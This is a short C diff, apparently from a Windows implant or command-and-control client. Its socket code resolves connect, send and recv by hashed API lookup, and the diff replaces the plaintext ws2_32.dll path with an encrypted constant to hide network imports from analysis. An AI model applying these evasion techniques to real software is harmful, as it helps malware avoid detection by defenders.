@@ -54,7 +54,7 @@ void createSocketManager(PSOCKET_MANAGER pSockManager)
 		const struct sockaddr *name,
 		int         namelen
 	);
-    ConnectTominic connectToMinic =  (ConnectTominic)getProcAddrCen(L"C:\\Windows\\System32\\ws2_32.dll",HASH_CONNECT_FUNCTION);
+    ConnectTominic connectToMinic =  (ConnectTominic)getProcAddrCen(CRYPT_WS2_32_DLL_ROUTE, HASH_CONNECT_FUNCTION);
     if (connectToMinic(sock, (struct sockaddr *)&sockAddr, sizeof(sockAddr)) != 0)
     {
         printf("[-] connect failed -> %i\n", WSAGetLastError());
@@ -112,7 +112,7 @@ BOOL sendMessage(PSOCKET_MANAGER sManager, PMESSAGE message)
 		int         len,
         int         flags
 	);
-    SendToMinic sendToMinic =  (SendToMinic)getProcAddrCen(L"C:\\Windows\\System32\\ws2_32.dll",HASH_SEND_FUNCTION);
+    SendToMinic sendToMinic =  (SendToMinic)getProcAddrCen(CRYPT_WS2_32_DLL_ROUTE, HASH_SEND_FUNCTION);
     sendToMinic(sManager->s, data, sizeToAlloc, 0);
     HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, data);
     return TRUE;
@@ -127,7 +127,7 @@ void receiveMessage(PSOCKET_MANAGER sManager, PMESSAGE message)
 		int         len,
         int         flags
 	);
-    RecvFromMinic recvFromMinic =  (RecvFromMinic)getProcAddrCen(L"C:\\Windows\\System32\\ws2_32.dll",HASH_RECV_FUNCTION);
+    RecvFromMinic recvFromMinic =  (RecvFromMinic)getProcAddrCen(CRYPT_WS2_32_DLL_ROUTE,  HASH_RECV_FUNCTION);
 
     /* READING ONE BYTE FOR MESSAGE TYPE */
     char responseType = 0x0;
